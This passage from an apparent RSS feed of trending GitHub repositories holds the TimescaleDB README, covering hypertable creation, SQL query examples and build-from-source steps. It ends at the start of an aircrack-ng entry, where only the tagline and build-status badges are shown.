&lt;h4&gt;&lt;a id="user-content-creating-a-hypertable" class="anchor" aria-hidden="true" href="#creating-a-hypertable"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Creating a hypertable&lt;/h4&gt;
&lt;div class="highlight highlight-source-sql"&gt;&lt;pre&gt;&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;--&lt;/span&gt; Do not forget to create timescaledb extension&lt;/span&gt;
CREATE EXTENSION timescaledb;

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;--&lt;/span&gt; We start by creating a regular SQL table&lt;/span&gt;
&lt;span class="pl-k"&gt;CREATE&lt;/span&gt; &lt;span class="pl-k"&gt;TABLE&lt;/span&gt; &lt;span class="pl-en"&gt;conditions&lt;/span&gt; (
  &lt;span class="pl-k"&gt;time&lt;/span&gt;        &lt;span class="pl-k"&gt;TIMESTAMPTZ&lt;/span&gt;       &lt;span class="pl-k"&gt;NOT NULL&lt;/span&gt;,
  location    &lt;span class="pl-k"&gt;TEXT&lt;/span&gt;              &lt;span class="pl-k"&gt;NOT NULL&lt;/span&gt;,
  temperature &lt;span class="pl-k"&gt;DOUBLE PRECISION&lt;/span&gt;  &lt;span class="pl-k"&gt;NULL&lt;/span&gt;,
  humidity    &lt;span class="pl-k"&gt;DOUBLE PRECISION&lt;/span&gt;  &lt;span class="pl-k"&gt;NULL&lt;/span&gt;
);

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;--&lt;/span&gt; Then we convert it into a hypertable that is partitioned by time&lt;/span&gt;
&lt;span class="pl-k"&gt;SELECT&lt;/span&gt; create_hypertable(&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;conditions&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;, &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;time&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;);&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.timescale.com/getting-started/creating-hypertables" rel="nofollow"&gt;Quick start: Creating hypertables&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.timescale.com/using-timescaledb/schema-management" rel="nofollow"&gt;Reference examples&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-inserting-and-querying-data" class="anchor" aria-hidden="true" href="#inserting-and-querying-data"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Inserting and querying data&lt;/h4&gt;
&lt;p&gt;Inserting data into the hypertable is done via normal SQL commands:&lt;/p&gt;
&lt;div class="highlight highlight-source-sql"&gt;&lt;pre&gt;&lt;span class="pl-k"&gt;INSERT INTO&lt;/span&gt; conditions(&lt;span class="pl-k"&gt;time&lt;/span&gt;, location, temperature, humidity)
  &lt;span class="pl-k"&gt;VALUES&lt;/span&gt; (NOW(), &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;office&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;, &lt;span class="pl-c1"&gt;70&lt;/span&gt;.&lt;span class="pl-c1"&gt;0&lt;/span&gt;, &lt;span class="pl-c1"&gt;50&lt;/span&gt;.&lt;span class="pl-c1"&gt;0&lt;/span&gt;);

&lt;span class="pl-k"&gt;SELECT&lt;/span&gt; &lt;span class="pl-k"&gt;*&lt;/span&gt; &lt;span class="pl-k"&gt;FROM&lt;/span&gt; conditions &lt;span class="pl-k"&gt;ORDER BY&lt;/span&gt; &lt;span class="pl-k"&gt;time&lt;/span&gt; &lt;span class="pl-k"&gt;DESC&lt;/span&gt; &lt;span class="pl-k"&gt;LIMIT&lt;/span&gt; &lt;span class="pl-c1"&gt;100&lt;/span&gt;;

&lt;span class="pl-k"&gt;SELECT&lt;/span&gt; time_bucket(&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;15 minutes&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;, &lt;span class="pl-k"&gt;time&lt;/span&gt;) &lt;span class="pl-k"&gt;AS&lt;/span&gt; fifteen_min,
    location, &lt;span class="pl-c1"&gt;COUNT&lt;/span&gt;(&lt;span class="pl-k"&gt;*&lt;/span&gt;),
    &lt;span class="pl-c1"&gt;MAX&lt;/span&gt;(temperature) &lt;span class="pl-k"&gt;AS&lt;/span&gt; max_temp,
    &lt;span class="pl-c1"&gt;MAX&lt;/span&gt;(humidity) &lt;span class="pl-k"&gt;AS&lt;/span&gt; max_hum
  &lt;span class="pl-k"&gt;FROM&lt;/span&gt; conditions
  &lt;span class="pl-k"&gt;WHERE&lt;/span&gt; &lt;span class="pl-k"&gt;time&lt;/span&gt; &lt;span class="pl-k"&gt;&amp;gt;&lt;/span&gt; NOW() &lt;span class="pl-k"&gt;-&lt;/span&gt; interval &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;3 hours&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;
  &lt;span class="pl-k"&gt;GROUP BY&lt;/span&gt; fifteen_min, location
  &lt;span class="pl-k"&gt;ORDER BY&lt;/span&gt; fifteen_min &lt;span class="pl-k"&gt;DESC&lt;/span&gt;, max_temp &lt;span class="pl-k"&gt;DESC&lt;/span&gt;;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In addition, TimescaleDB includes additional functions for time-series
analysis that are not present in vanilla PostgreSQL. (For example, the &lt;code&gt;time_bucket&lt;/code&gt; function above.)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.timescale.com/using-timescaledb/hypertables" rel="nofollow"&gt;Quick start: Basic operations&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.timescale.com/using-timescaledb/writing-data" rel="nofollow"&gt;Reference examples&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.timescale.com/api" rel="nofollow"&gt;TimescaleDB API&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-installation" class="anchor" aria-hidden="true" href="#installation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Installation&lt;/h3&gt;
&lt;p&gt;TimescaleDB is available pre-packaged for several platforms:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Linux:
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.timescale.com/getting-started/installation/rhel-centos/installation-yum" rel="nofollow"&gt;RedHat / CentOS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.timescale.com/getting-started/installation/ubuntu/installation-apt-ubuntu" rel="nofollow"&gt;Ubuntu&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.timescale.com/getting-started/installation/debian/installation-apt-debian" rel="nofollow"&gt;Debian&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.timescale.com/getting-started/installation/docker/installation-docker" rel="nofollow"&gt;Docker&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.timescale.com/getting-started/installation/macos/installation-homebrew" rel="nofollow"&gt;MacOS (Homebrew)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.timescale.com/getting-started/installation/windows/installation-windows" rel="nofollow"&gt;Windows&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We recommend following our detailed &lt;a href="https://docs.timescale.com/getting-started/installation" rel="nofollow"&gt;installation instructions&lt;/a&gt;.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-building-from-source-unix-based-systems" class="anchor" aria-hidden="true" href="#building-from-source-unix-based-systems"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Building from source (Unix-based systems)&lt;/h4&gt;
&lt;p&gt;If you are building from source for &lt;strong&gt;non-development purposes&lt;/strong&gt;
(i.e., you want to run TimescaleDB, not submit a patch), you should
&lt;strong&gt;always use a release-tagged commit and not build from &lt;code&gt;master&lt;/code&gt;&lt;/strong&gt;.
See the Releases tab for the latest release.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Prerequisites&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A standard PostgreSQL 9.6, 10, or 11 installation with development
environment (header files) (e.g., &lt;code&gt;postgresql-server-dev-11 &lt;/code&gt;package
for Linux, Postgres.app for MacOS)&lt;/li&gt;
&lt;li&gt;C compiler (e.g., gcc or clang)&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cmake.org/" rel="nofollow"&gt;CMake&lt;/a&gt; version 3.4 or greater&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;git clone git@github.com:timescale/timescaledb.git
&lt;span class="pl-c1"&gt;cd&lt;/span&gt; timescaledb
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Find the latest release and checkout, e.g. for 1.3.0:&lt;/span&gt;
git checkout 1.3.0
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Bootstrap the build system&lt;/span&gt;
./bootstrap
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; To build the extension&lt;/span&gt;
&lt;span class="pl-c1"&gt;cd&lt;/span&gt; build &lt;span class="pl-k"&gt;&amp;amp;&amp;amp;&lt;/span&gt; make
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; To install&lt;/span&gt;
make install&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note, if you have multiple versions of PostgreSQL installed you can specify the path to &lt;code&gt;pg_config&lt;/code&gt; that should be used by using &lt;code&gt;./bootstrap -DPG_CONFIG=/path/to/pg_config&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Please see our &lt;a href="https://docs.timescale.com/getting-started/installation" rel="nofollow"&gt;additional configuration instructions&lt;/a&gt;.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-building-from-source-windows" class="anchor" aria-hidden="true" href="#building-from-source-windows"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Building from source (Windows)&lt;/h4&gt;
&lt;p&gt;If you are building from source for &lt;strong&gt;non-development purposes&lt;/strong&gt;
(i.e., you want to run TimescaleDB, not submit a patch), you should
&lt;strong&gt;always use a release-tagged commit and not build from &lt;code&gt;master&lt;/code&gt;&lt;/strong&gt;.
See the Releases tab for the latest release.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Prerequisites&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A standard &lt;a href="https://www.enterprisedb.com/downloads/postgres-postgresql-downloads#windows" rel="nofollow"&gt;PostgreSQL 9.6, 10, or 11 64-bit installation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;OpenSSL for Windows&lt;/li&gt;
&lt;li&gt;Microsoft Visual Studio 2017 with CMake and Git components&lt;/li&gt;
&lt;li&gt;OR Visual Studio 2015/2016 with &lt;a href="https://cmake.org/" rel="nofollow"&gt;CMake&lt;/a&gt; version 3.4 or greater and Git&lt;/li&gt;
&lt;li&gt;Make sure all relevant binaries are in your PATH: &lt;code&gt;pg_config&lt;/code&gt; and &lt;code&gt;cmake&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If using Visual Studio 2017 with the CMake and Git components, you
should be able to simply clone the repo and open the folder in
Visual Studio which will take care of the rest.&lt;/p&gt;
&lt;p&gt;If you are using an earlier version of Visual Studio, then it can
be built in the following way:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;git clone git@github.com:timescale/timescaledb.git
&lt;span class="pl-c1"&gt;cd&lt;/span&gt; timescaledb

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Find the latest release and checkout, e.g. for 1.3.0:&lt;/span&gt;
git checkout 1.3.0
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Bootstrap the build system&lt;/span&gt;
bootstrap.bat
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; To build the extension from command line&lt;/span&gt;
cmake --build ./build --config Release
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; To install&lt;/span&gt;
cmake --build ./build --config Release --target install

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Alternatively, build in Visual Studio via its built-in support for&lt;/span&gt;
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; CMake or by opening the generated build/timescaledb.sln solution file.&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;&lt;a id="user-content-useful-tools" class="anchor" aria-hidden="true" href="#useful-tools"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Useful tools&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/timescale/timescaledb-tune"&gt;timescaledb-tune&lt;/a&gt;: Helps
set your PostgreSQL configuration settings based on your system's resources.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/timescale/timescaledb-parallel-copy"&gt;timescaledb-parallel-copy&lt;/a&gt;: Parallelize your initial bulk loading by using PostgreSQL's
&lt;code&gt;COPY&lt;/code&gt; across multiple workers.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-additional-documentation" class="anchor" aria-hidden="true" href="#additional-documentation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Additional documentation&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.timescale.com/introduction" rel="nofollow"&gt;Why use TimescaleDB?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.timescale.com/getting-started/setup/migrate-from-postgresql" rel="nofollow"&gt;Migrating from PostgreSQL&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.timescale.com/using-timescaledb/writing-data" rel="nofollow"&gt;Writing data&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.timescale.com/using-timescaledb/reading-data" rel="nofollow"&gt;Querying and data analytics&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.timescale.com/tutorials" rel="nofollow"&gt;Tutorials and sample data&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-support" class="anchor" aria-hidden="true" href="#support"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Support&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://slack.timescale.com" rel="nofollow"&gt;Slack Channel&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/timescale/timescaledb/issues"&gt;Github Issues&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="mailto:support@timescale.com"&gt;Support Email&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-contributing" class="anchor" aria-hidden="true" href="#contributing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contributing&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/timescale/timescaledb/blob/master/CONTRIBUTING.md"&gt;Contributor instructions&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/timescale/timescaledb/blob/master/docs/StyleGuide.md"&gt;Code style guide&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>timescale</author><guid isPermaLink="false">https://github.com/timescale/timescaledb</guid><pubDate>Tue, 04 Feb 2020 00:20:00 GMT</pubDate></item><item><title>aircrack-ng/aircrack-ng #21 in C, This week</title><link>https://github.com/aircrack-ng/aircrack-ng</link><description>&lt;p&gt;&lt;i&gt;WiFi security auditing tools suite&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-aircrack-ng" class="anchor" aria-hidden="true" href="#aircrack-ng"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Aircrack-ng&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://travis-ci.org/aircrack-ng/aircrack-ng" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/f7220f61dea13611e4be89b8ec9c2b091fca89b1/68747470733a2f2f7472617669732d63692e6f72672f616972637261636b2d6e672f616972637261636b2d6e672e7376673f6272616e63683d6d6173746572" alt="Linux/Mac Build Status" data-canonical-src="https://travis-ci.org/aircrack-ng/aircrack-ng.svg?branch=master" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://ci.appveyor.com/project/aircrack-ng/aircrack-ng" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/4a611a3377e23d1ac0952c355dc284bae55c5fde/68747470733a2f2f63692e6170707665796f722e636f6d2f6170692f70726f6a656374732f7374617475732f6769746875622f616972637261636b2d6e672f616972637261636b2d6e673f6272616e63683d6d6173746572267376673d74727565" alt="Windows Build Status" data-canonical-src="https://ci.appveyor.com/api/projects/status/github/aircrack-ng/aircrack-ng?branch=master&amp;amp;svg=true" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://buildbot.aircrack-ng.org/" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/38d2d488955017ef7fc572171c8df586523cc9b0/68747470733a2f2f6275696c64626f742e616972637261636b2d6e672e6f72672f6261646765732f616972637261636b2d6e672e7376673f6c6566745f746578743d496e74656c253230436f6d70696c65722532304275696c64" alt="Intel Compiler Build Status" data-canonical-src="https://buildbot.aircrack-ng.org/badges/aircrack-ng.svg?left_text=Intel%20Compiler%20Build" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://buildbot.aircrack-ng.org/" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/363fc177c7fc46058b5b35e0f597d925975a7c3d/68747470733a2f2f6275696c64626f742e616972637261636b2d6e672e6f72672f6261646765732f616972637261636b2d6e672d616c70696e652e7376673f6c6566745f746578743d416c70696e652532304c696e75782532304275696c64" alt="Alpine Linux Build Status" data-canonical-src="https://buildbot.aircrack-ng.org/badges/aircrack-ng-alpine.svg?left_text=Alpine%20Linux%20Build" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://buildbot.aircrack-ng.org/" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/75416823a154061962a0d315207c9a091e511d06/68747470733a2f2f6275696c64626f742e616972637261636b2d6e672e6f72672f6261646765732f616972637261636b2d6e672d6b616c692e7376673f6c6566745f746578743d4b616c692532304c696e75782532304275696c64" alt="Kali Linux Build Status" data-canonical-src="https://buildbot.aircrack-ng.org/badges/aircrack-ng-kali.svg?left_text=Kali%20Linux%20Build" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://buildbot.aircrack-ng.org/" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/eba2d5afea689f04b2f35d76eda85d009004cb99/68747470733a2f2f6275696c64626f742e616972637261636b2d6e672e6f72672f6261646765732f616972637261636b2d6e672d61726d656c2e7376673f6c6566745f746578743d41726d656c2532304b616c692532304c696e75782532304275696c64" alt="Armel Kali Linux Build Status" data-canonical-src="https://buildbot.aircrack-ng.org/badges/aircrack-ng-armel.svg?left_text=Armel%20Kali%20Linux%20Build" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://buildbot.aircrack-ng.org/" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/1bc7b826541a7d97406b292a42c1ccdb524c0234/68747470733a2f2f6275696c64626f742e616972637261636b2d6e672e6f72672f6261646765732f616972637261636b2d6e672d61726d68662e7376673f6c6566745f746578743d41726d68662532304b616c692532304c696e75782532304275696c64" alt="Armhf Kali Linux Build Status" data-canonical-src="https://buildbot.aircrack-ng.org/badges/aircrack-ng-armhf.svg?left_text=Armhf%20Kali%20Linux%20Build" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://buildbot.aircrack-ng.org/" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/9ee38cd8391f3e637c5f5ce1d1c4277d2f627d74/68747470733a2f2f6275696c64626f742e616972637261636b2d6e672e6f72672f6261646765732f616972637261636b2d6e672d64666c792e7376673f6c6566745f746578743d447261676f6e466c792532304275696c64" alt="DragonFly BSD Build Status" data-canonical-src="https://buildbot.aircrack-ng.org/badges/aircrack-ng-dfly.svg?left_text=DragonFly%20Build" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://buildbot.aircrack-ng.org/" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/cca439ea0899b3bdf9b1b10addf3c625ebe8daca/68747470733a2f2f6275696c64626f742e616972637261636b2d6e672e6f72672f6261646765732f616972637261636b2d6e672d666273642d31312e7376673f6c6566745f746578743d4672656542534425323031312532304275696c64" alt="FreeBSD 11 Build Status" data-canonical-src="https://buildbot.aircrack-ng.org/badges/aircrack-ng-fbsd-11.svg?left_text=FreeBSD%2011%20Build" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://buildbot.aircrack-ng.org/" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/59bb8e3f65a2ed2330413d61485af44cf2501c42/68747470733a2f2f6275696c64626f742e616972637261636b2d6e672e6f72672f6261646765732f616972637261636b2d6e672d666273642d31322e7376673f6c6566745f746578743d4672656542534425323031322532304275696c64" alt="FreeBSD 12 Build Status" data-canonical-src="https://buildbot.aircrack-ng.org/badges/aircrack-ng-fbsd-12.svg?left_text=FreeBSD%2012%20Build" style="max-width:100%;"&gt;&lt;/a&gt;
